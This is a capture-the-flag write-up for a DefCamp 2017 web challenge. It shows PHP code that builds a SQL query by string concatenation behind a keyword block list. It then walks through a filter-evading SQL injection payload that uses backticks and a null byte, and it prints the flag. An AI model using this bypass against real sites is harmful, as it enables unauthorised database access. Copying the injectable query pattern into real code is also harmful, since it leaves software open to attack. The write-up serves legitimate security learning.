**View Source Code**

By viewing the code at `https://brave.dctf-quals-17.def.camp/index.php~`, we can retrieve the details
```
<?php

$db  = mysqli_connect('localhost','web_brave','','web_brave');

$id  = @$_GET['id'];
$key = $db->real_escape_string(@$_GET['key']);

if(preg_match('/\s|[\(\)\'"\/\\=&\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i', $id))
    die('Attack Detected. Try harder: '. $_SERVER['REMOTE_ADDR']); // attack detected

$query = "SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '".$key."'";
$q = $db->query($query);

if($q->num_rows) {
    echo '<h3>Users:</h3><ul>';
    while($row = $q->fetch_array()) {
        echo '<li>'.$row['name'].'</li>';
    }

    echo '</ul>';
} else {
    die('<h3>Nop.</h3>');
}
```
based on the `$id` and `$key`, the possible point of entry will most likely be `$id`, and by studying the conditions in the preg_match
`%`, `0`, `;` and ``` are not checked.

**Constructing the query**
After analyzing the query, we can form a similar construct to the SQL `1=1`,

```
`id` = `id`
```
has the same effect as `1=1`

Lastly, we want to ignore `$key` param and end the query after inserting `$id`, hence we append `;%00` at the back.

**Conclusion**
Submitting `https://brave.dctf-quals-17.def.camp/index.php?id=`id`;%00` will give us the flag

Users:
- Try Harder
- DCTF{602dcfeedd3aae23f05cf93d121907ec925bd70c50d78ac839ad48c0a93cfc54}
